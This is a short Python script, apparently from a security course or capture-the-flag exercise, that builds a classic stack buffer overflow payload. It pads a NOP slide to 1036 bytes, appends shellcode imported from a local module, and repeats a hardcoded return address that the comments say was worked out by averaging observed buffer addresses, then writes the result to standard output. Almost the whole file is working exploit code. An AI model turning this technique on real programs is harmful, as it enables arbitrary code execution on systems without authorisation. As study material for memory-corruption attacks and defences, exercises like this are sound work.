import sys
from struct import pack
from shellcode import shellcode

# calculated buffer addresses: fff6e860, fff6e900, fff6e8c0, fff6e910, fff6e900, fff6e920, fff6e920, fff6e830, fff6e8b0, fff6e840 
# average: fff6e8c1 - 1 for a multiple of 4, then added 256 to get close to the middle of the buffer
payload = pack("<I", 0xfff6e9c0)
# fill the buffer with NOPs
nop_slide = b'\x90' * (1036 - len(shellcode))
# spam the return address up the stack
sys.stdout.buffer.write(nop_slide + shellcode + (payload * 3))
